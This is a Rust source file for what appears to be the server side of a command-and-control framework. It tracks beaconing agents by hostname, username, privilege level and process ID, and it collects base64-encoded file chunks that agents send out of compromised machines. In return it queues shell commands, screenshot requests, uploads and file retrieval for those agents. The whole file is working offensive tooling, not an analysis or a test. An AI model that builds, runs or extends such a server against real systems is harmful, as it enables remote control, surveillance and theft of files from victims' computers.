use std::{
    collections::HashMap,
    io::{BufRead, BufReader, Read, Write},
    net::{TcpListener, TcpStream},
    sync::{Arc, Mutex},
    time::Instant,
};

// ── Public types ─────────────────────────────────────────────────────────────

#[derive(Clone)]
pub struct LiveSession {
    pub agent_id:   String,
    pub hostname:   String,
    pub username:   String,
    pub os:         String,
    pub arch:       String,
    pub pid:        u32,
    pub elevated:   bool,
    pub ip:         String,
    pub first_seen: Instant,
    pub last_seen:  Instant,
}

pub type SessionStore = Arc<Mutex<HashMap<String, LiveSession>>>;
pub type CommandQueue = Arc<Mutex<HashMap<String, Vec<String>>>>;

#[derive(Clone)]
pub struct DownloadChunk {
    pub file_path: String,
    pub offset: u64,
    pub data: Vec<u8>,
}

/// Maps agent_id -> file_path -> accumulated file data
pub type DownloadStore = Arc<Mutex<HashMap<String, HashMap<String, Vec<u8>>>>>;

pub fn new_store() -> SessionStore {
    Arc::new(Mutex::new(HashMap::new()))
}

pub fn new_command_queue() -> CommandQueue {
    Arc::new(Mutex::new(HashMap::new()))
}

pub fn new_download_store() -> DownloadStore {
    Arc::new(Mutex::new(HashMap::new()))
}

pub fn queue_command(queue: &CommandQueue, agent_id: &str, command: String) {
    if let Ok(mut q) = queue.lock() {
        q.entry(agent_id.to_string())
            .or_insert_with(Vec::new)
            .push(command);
    }
}

/// Store a file chunk at the given offset, accumulating with previous chunks
pub fn store_download_chunk(store: &DownloadStore, agent_id: &str, file_path: &str, offset: u64, data: Vec<u8>) {
    if let Ok(mut s) = store.lock() {
        let agent_map = s.entry(agent_id.to_string()).or_insert_with(HashMap::new);
        let file_data = agent_map.entry(file_path.to_string()).or_insert_with(Vec::new);

        // Expand buffer if needed
        let end_offset = offset as usize + data.len();
        if file_data.len() < end_offset {
            file_data.resize(end_offset, 0);
        }

        // Copy chunk data at the correct offset
        file_data[offset as usize..end_offset].copy_from_slice(&data);
    }
}

/// Legacy function for compatibility (stores complete file)
pub fn store_download(store: &DownloadStore, agent_id: &str, file_path: &str, data: Vec<u8>) {
    if let Ok(mut s) = store.lock() {
        let agent_map = s.entry(agent_id.to_string()).or_insert_with(HashMap::new);
        agent_map.insert(file_path.to_string(), data);
    }
}

pub fn retrieve_download(store: &DownloadStore, agent_id: &str, file_path: &str) -> Option<Vec<u8>> {
    if let Ok(mut s) = store.lock() {
        if let Some(agent_map) = s.get_mut(agent_id) {
            return agent_map.remove(file_path);
        }
    }
    None
}

/// Spawn the listener in a background thread.  Returns true if the socket
/// bound successfully, false if the port was already in use.
pub fn start(port: u16, store: SessionStore, cmd_queue: CommandQueue, dl_store: DownloadStore) -> bool {
    let listener = match TcpListener::bind(format!("0.0.0.0:{}", port)) {
        Ok(l) => l,
        Err(_) => return false,
    };
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            if let Ok(stream) = stream {
                let store = Arc::clone(&store);
                let cmd_queue = Arc::clone(&cmd_queue);
                let dl_store = Arc::clone(&dl_store);
                std::thread::spawn(move || handle_conn(stream, store, cmd_queue, dl_store));
            }
        }
    });
    true
}

// ── Status helpers ────────────────────────────────────────────────────────────

pub fn session_status(ls: &LiveSession) -> &'static str {
    let secs = ls.last_seen.elapsed().as_secs();
    if secs < 90    { "Active" }
    else if secs < 300 { "Idle" }
    else            { "Lost" }
}

pub fn last_seen_str(ls: &LiveSession) -> String {
    let secs = ls.last_seen.elapsed().as_secs();
    if secs < 60        { format!("{}s ago", secs) }
    else if secs < 3600 { format!("{}m ago", secs / 60) }
    else                { format!("{}h ago", secs / 3600) }
}

pub fn uptime_str(ls: &LiveSession) -> String {
    let secs = ls.first_seen.elapsed().as_secs();
    format!("{}h {:02}m", secs / 3600, (secs % 3600) / 60)
}

// ── Connection handler ────────────────────────────────────────────────────────

fn handle_conn(stream: TcpStream, store: SessionStore, cmd_queue: CommandQueue, dl_store: DownloadStore) {
    let ip = stream
        .peer_addr()
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|_| "unknown".into());

    let mut reader = match stream.try_clone() {
        Ok(s) => BufReader::new(s),
        Err(_) => return,
    };

    // ── Read HTTP headers ──
    let mut content_len = 0usize;
    loop {
        let mut line = String::new();
        if reader.read_line(&mut line).unwrap_or(0) == 0 { return; }
        let trimmed = line.trim_end_matches(['\r', '\n']);
        if trimmed.is_empty() { break; }
        let lower = trimmed.to_ascii_lowercase();
        if lower.starts_with("content-length:") {
            content_len = trimmed[15..].trim().parse().unwrap_or(0);
        }
    }

    // ── Read body ──
    let capped = content_len.min(131_072);
    let mut body = vec![0u8; capped];
    if reader.read_exact(&mut body).is_err() { return; }
    let body_str = String::from_utf8_lossy(&body);

    // ── Parse beacon fields ──
    let agent_id = match json_str(&body_str, "agent_id") {
        Some(v) if !v.is_empty() => v,
        _ => return,
    };

    let hostname = json_str(&body_str, "hostname").unwrap_or_else(|| ip.clone());
    let username = json_str(&body_str, "username").unwrap_or_else(|| "unknown".into());
    let os       = json_str(&body_str, "os")      .unwrap_or_else(|| "unknown".into());
    let arch     = json_str(&body_str, "arch")    .unwrap_or_else(|| "unknown".into());
    let pid      = json_u64(&body_str, "pid") as u32;
    let elevated = json_u64(&body_str, "elevated") != 0;

    // ── Parse file chunks from beacon msgs array ──
    if let Some(msgs_start) = body_str.find("\"msgs\":[") {
        let msgs_content = &body_str[msgs_start + 8..];
        if let Some(msgs_end) = msgs_content.find(']') {
            let msgs_json = &msgs_content[..msgs_end];

            // Parse each message in the array
            let mut pos = 0;
            while let Some(obj_start) = msgs_json[pos..].find('{') {
                pos += obj_start;
                if let Some(obj_end) = msgs_json[pos..].find('}') {
                    let obj = &msgs_json[pos..pos + obj_end + 1];

                    // Check if this is a file chunk message
                    if obj.contains("\"file\"") && obj.contains("\"chunk\"") {
                        if let Some(file_field) = json_str(obj, "file") {
                            if let Some(chunk_b64) = json_str(obj, "chunk") {
                                if let Some(decoded) = base64_decode(&chunk_b64) {
                                    // Extract offset if present (for multi-chunk reassembly)
                                    let offset = json_u64(obj, "offset");
                                    store_download_chunk(&dl_store, &agent_id, &file_field, offset, decoded);
                                }
                            }
                        }
                    }
                    pos += obj_end + 1;
                } else {
                    break;
                }
            }
        }
    }

    // ── Update session store ──
    {
        let now = Instant::now();
        let mut map = store.lock().unwrap();
        let entry = map.entry(agent_id.clone()).or_insert_with(|| LiveSession {
            agent_id:   agent_id.clone(),
            hostname:   hostname.clone(),
            username:   username.clone(),
            os:         os.clone(),
            arch:       arch.clone(),
            pid,
            elevated,
            ip:         ip.clone(),
            first_seen: now,
            last_seen:  now,
        });
        entry.last_seen = now;
        entry.hostname  = hostname;
        entry.username  = username;
        entry.os        = os;
        entry.arch      = arch;
        entry.pid       = pid;
        entry.elevated  = elevated;
        entry.ip        = ip;
    }

    // ── Build response with queued commands ──
    let commands_json = {
        let mut q = cmd_queue.lock().unwrap();
        let cmds = q.remove(&agent_id).unwrap_or_default();
        if cmds.is_empty() {
            "[]".to_string()
        } else {
            let cmd_objs: Vec<String> = cmds.iter()
                .map(|payload| {
                    // Determine command_id based on payload content
                    let (cmd_id, cmd_payload) = if payload.starts_with('{') {
                        ("upload", payload.clone())  // JSON payload = upload command
                    } else if payload == "screenshot" {
                        ("screenshot", payload.clone())  // Screenshot command
                    } else if payload.starts_with("shell:") {
                        ("shell", payload[6..].to_string())  // Shell command (strip "shell:" prefix)
                    } else {
                        ("file-recv", payload.clone())  // Plain path = file-recv command
                    };
                    let escaped = cmd_payload.replace('\\', "\\\\").replace('"', "\\\"");
                    format!("{{\"command_id\":\"{}\",\"seq\":0,\"payload\":\"{}\"}}", cmd_id, escaped)
                })
                .collect();
            format!("[{}]", cmd_objs.join(","))
        }
    };

    let body = format!("{{\"commands\":{}}}", commands_json);
    let body_bytes = body.as_bytes();
    let hdr = format!(
        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        body_bytes.len()
    );
    let mut w = reader.into_inner();
    let _ = w.write_all(hdr.as_bytes());
    let _ = w.write_all(body_bytes);
}

// ── Minimal JSON field extractors ─────────────────────────────────────────────

fn json_str(json: &str, key: &str) -> Option<String> {
    let needle = format!("\"{}\":\"", key);
    let start  = json.find(&needle)? + needle.len();
    let mut out = String::new();
    let mut chars = json[start..].chars();
    while let Some(c) = chars.next() {
        match c {
            '"'  => break,
            '\\' => { if let Some(e) = chars.next() { out.push(e); } }
            _    => out.push(c),
        }
    }
    Some(out)
}

fn json_u64(json: &str, key: &str) -> u64 {
    let needle = format!("\"{}\":", key);
    let start  = match json.find(&needle) {
        Some(p) => p + needle.len(),
        None    => return 0,
    };
    json[start..]
        .trim_start()
        .chars()
        .take_while(|c| c.is_ascii_digit())
        .collect::<String>()
        .parse()
        .unwrap_or(0)
}

fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let mut result = Vec::new();
    let mut chars = s.chars().filter(|c| !c.is_whitespace());
    loop {
        let mut buf = [0u8; 4];
        for i in 0..4 {
            match chars.next() {
                Some('=') => {
                    if i < 2 { return None; }
                    return Some(result);
                }
                Some(c) => buf[i] = decode_b64_char(c)?,
                None => return if i == 0 { Some(result) } else { None },
            }
        }
        let b = ((buf[0] as u32) << 18) | ((buf[1] as u32) << 12) | ((buf[2] as u32) << 6) | (buf[3] as u32);
        result.push((b >> 16) as u8);
        result.push((b >> 8) as u8);
        result.push(b as u8);
    }
}

fn decode_b64_char(c: char) -> Option<u8> {
    match c {
        'A'..='Z' => Some((c as u8) - b'A'),
        'a'..='z' => Some((c as u8) - b'a' + 26),
        '0'..='9' => Some((c as u8) - b'0' + 52),
        '+' => Some(62),
        '/' => Some(63),
        _ => None,
    }
}
